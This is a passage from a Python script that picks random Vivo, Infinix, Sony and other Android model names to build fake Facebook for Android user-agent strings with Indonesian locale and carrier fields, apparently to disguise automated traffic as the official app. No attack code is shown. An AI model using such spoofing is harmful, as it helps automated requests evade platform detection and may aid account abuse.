'STK-L22', 'STK-LX3', 'FRL-L23', 'FRL-L22', 'FRL-L22'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Vivo" in str(self.device):
                self.android_model = random.choice(['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Infinix" in str(self.device):
                self.android_model = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Sony" in str(self.device):
                self.android_model = random.choice(['BRAVIA 2015', 'BRAVIA 2K GB ATV3', 'BRAVIA 4K 2015', 'BRAVIA 4K GB', 'BRAVIA 4K GB ATV3', 'BRAVIA 4K UR2', 'BRAVIA 4K UR3', 'BRAVIA 4K VH2', 'BRAVIA VH1', 'BRAVIA VU1', 'Sony Experia 10', 'H4433', 'SONY-M880', 'SGP412', 'SGP551', 'SmartWatch 3', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'NW-A100Series', 'NW-Z1000Series', 'Sony Xperia', 'J9110', '802SO', 'SOV40', 'SO-51A', 'SOG01', 'XQ-AT51', 'XQ-AT42', 'SO51Aa', 'SO-51B', 'XQ-BC52', 'SOG03', 'XQ-BC72', 'XQ-CT72', 'XQ-CT54', 'SOG06', 'I4113', 'I3113', 'I4193', 'SO-41A', 'SOV43', 'A001SO', 'XQ-AU52', 'XQ-AT52', 'XQ-BT52', 'SOG04', 'A102SO', 'SO-52B', 'XQ-BT44', 'XQ-CC54', 'XQ-CC72', 'SO-52C', 'A202SO', 'I4293', 'I4213', 'SOV41', '901SO', 'SO-01M', 'J8210', 'J9210', 'SO-52A', 'SOG02', 'XQ-AS52', 'A002SO', 'XQ-AS72', 'XQ-BQ52', 'SO-53B', 'SOG05', 'XQ-BQ72', 'A103SO', 'XQ-CQ54', 'XQ-CQ72', 'SOV42', '902SO', 'J3273', 'SO-04E', 'SonySO-04E', 'Xperia A', 'SO-04F', 'SAMSUNG Xperia a369i', 'SO-04G', 'SO-04G', 'J3173', 'SO-41B', 'SOG08', 'SO-53C', 'A203SO', 'Xperia Active', 'Xperia Active', 'Xperia Active', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'LT26w', 'LT26w', 'SO-01E', 'Sony Xperia B6376', 'XPERIA BEAST 3', 'Xperia Burst', 'S39h', 'C2304', 'C2305', 'C2304', 'C2305', 'D2533', 'D2502', 'E5306', 'E5303', 'E5303', 'E5353', 'E5333', 'E5363', 'E5333', 'Xperia C5', 'E5553', 'E5506', 'E5533', 'E5563', 'XPERIA CUSTOM XA8', 'C1505', 'C1505', 'C1504', 'SonyC1504', 'SonyC1505v', 'SonyC1505', 'SonyC1504', 'SonyC1505', 'SonyC1504', 'C1505', 'C1505', 'SonyC1505', 'SonyC1505', 'SonyC1505', 'C1604', 'SonyC1605', 'SonyC1604', 'C1605', 'C1605', 'SonyC1605', 'C1604', 'SonyC1605', 'D2005', 'D2004', 'SonyD2005', 'D2005', 'D2104', 'D2114', 'D2105', 'D2105', 'XPERIA E16i', 'D2203', 'D2202', 'D2243', 'D2206', 'Xperia E3 3G', 'E3 Dual', 'D2212', 'D2212', 'D2212', 'E2115', 'E2104', 'E2105', 'xperia e4 dual', 'E2003', 'E2053', 'E2006', 'E2043', 'E2033', 'E2033', 'F3311', 'F3313', 'Xperia F_v3 Ultra', 'SONY XPERIA G', 'SonyST27a', 'SonyST27i', 'ST27a', 'ST27i', 'ST27I', 'ru ST27i', 'SonyST27i', 'SonyEricssonST27i', 'ST27i', 'ST27i', 'SO-04D', 'SonySO-04D', 'Xperia H870', 'SonyLT28i', 'SonyLT28h', 'LT28h', 'SonyEricssonLT28at', 'SonyEricssonLT28h', 'LT28i', 'LT28h', 'SonyLT28h', 'Xperia ion', 'Xperia ion', 'SonyEricssonLT28i', 'SonyEricssonLT28i', 'SonyEricssonLT28h', 'SonyEricssonLT28i', 'SonyST26a', 'ST26a', 'SonyST26i-o', 'SonyST26i', 'ST26i', 'ST26i', 'Xperia J', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'ST26i', 'C2105', 'C2105', 'C2105', 'C2105', 'C2105', 'G3311', 'G3311', 'G3313', 'G3312', 'ru G3312', 'H3311', 'H3321', 'H4311', 'I3312', 'I4312', 'XQ-AD52', 'C1905', 'C1904', 'C1905', 'SonyC1904', 'SonyC1905', 'C1905', 'C1905', 'C2004', 'C2005', 'D2303', 'D2306', 'D2303', 'Xperia M2 3G', 'D2406', 'D2403', 'D2302', 'XPERIA M2 HSPASS', 'E2303', 'E2333', 'E2306', 'E2363', 'E2312', 'E2312', 'E5603', 'E5606', 'E5653', 'E5633', 'E5663', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia mini pro', 'ST23i', 'SonyST23iv', 'SonyST23a', 'ST23i', 'SonyST23i', 'ST23i', 'ST23i', 'ST23i', 'SonyST23i', 'SonyST23i', 'SonyST23i', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo L', 'Xperia Neo V', 'Xperia Neo V', 'Sony Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'SO-02D', 'Xperia P', 'SonyLT22i', 'LT22i', 'SonyEricssonLT22i', 'SonyEricssonLT22i-o', 'LT22i', 'LT22i', 'LT22i', 'SonyEricssonLT22i-o', 'SonyLT22i', 'XQ-AQ52', 'XQ-AQ62', 'XQ-BE52', 'XQ-BE62', 'XQ-BE72', 'G2299', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Sony Xperia RC', 'Sony Xperia RC', 'SonyLT26iv', 'LT26i', 'SonyEricssonLT26i-o', 'SonyEricssonLT26i', 'LT26i', 'Xperia S', 'LT26i', 'SonyEricssonLT26i', 'Xperia S', 'Xperia S', 'Xperia S', 'SonyLT26i', 'LT26ii', 'ru LT26ii', 'LT26ii', 'LT26ii', 'Xperia Sola', 'Xperia Sola', 'C5303', 'C5302', 'C5306', 'SonyC5303', 'SonyC5306', 'C5303', 'Xperia SP', 'SO-05D', 'LT30p', 'SonyLT30p-o', 'LT30p', 'SonyLT30p', 'LT30p', 'LT30a', 'SonyLT30a', 'D5303', 'D5306', 'D5316', 'XM50h', 'XM50t', 'D5303', 'D5322', 'Xperia T3', 'D5103', 'D5102', 'D5106', 'D5103', 'Xperia Tab', 'SGPT12', 'Xperia Tablet S', 'SGPT13', 'SGPT13', 'SGPT12', 'SGP311', 'SGP321', 'SGP312', 'SGP512', 'SGP511', 'SGP521', 'SGP621', 'SGP611', 'SGP712', 'SonyST21i', 'SonyST21i', 'SonyST21i-o', 'ST21i', 'ST21a', 'ST21i', 'SonyST21a', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21a', 'SonyST21i', 'SonyST21a', 'ST21i2', 'SonyST21a2', 'SonyST21i2', 'SonyST21i2', 'SonyST21i2', 'ru ST21i2', 'SonyST21i2', 'ST21i2', 'LT29i', 'Xperia TX', 'SonyST25i', 'ST25a', 'ST25i', 'ST25a', 'SonyEricssonST25i', 'ST25i', 'ru ST25i', 'ST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SOL22', 'SOL22', 'SonySOL22', 'Xperia UL', 'Xperia V', 'SonyLT25i', 'Sony Xperia V', 'SonyLT25i', 'SonySOL21', 'F5121', 'F5321', 'SO-02J', 'F5122', '502SO', 'F8131', 'SO-04H', 'SOV33', 'F8132', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia x10 Mini Pro', 'Xperia X42', 'Xperia X8', 'XPERIA X8', 'Xperia X8', 'XPERIA X8', 'XPERIA X8', 'Xperia X8', 'Xperia X8', 'Xperia 